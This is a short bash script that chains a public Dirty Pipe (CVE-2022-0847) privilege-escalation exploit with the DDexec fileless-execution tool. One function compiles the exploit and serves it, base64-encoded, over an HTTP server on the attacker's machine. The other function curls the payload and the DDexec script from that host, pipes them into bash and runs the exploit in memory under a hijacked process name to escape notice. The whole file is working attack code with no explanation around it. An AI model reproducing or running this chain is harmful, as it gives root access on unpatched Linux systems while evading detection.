_ddexec_dirtypipe_exploit2_attacker_machine() {
	PORT=$1
	mkdir /tmp/test 2> /dev/null
	cd /tmp/test
	wget https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh -O ddexec.sh
	wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c -O dp-setuid.c
	gcc dp-setuid.c -o dp-setuid
	base64 -w0 dp-setuid > dp-setuid.b64
	python3 -m http.server $PORT
}

_ddexec_dirtypipe_exploit2_target_machine() {
	IP=$1
	PORT=$2
	PROCESSNAME=$3
	HIJACKEDPROCESSNAME=$4
	curl http://$IP:$PORT/dp-setuid.b64 | bash <(curl http://$IP:$PORT/ddexec.sh) $PROCESSNAME /usr/bin/$HIJACKEDPROCESSNAME 
}
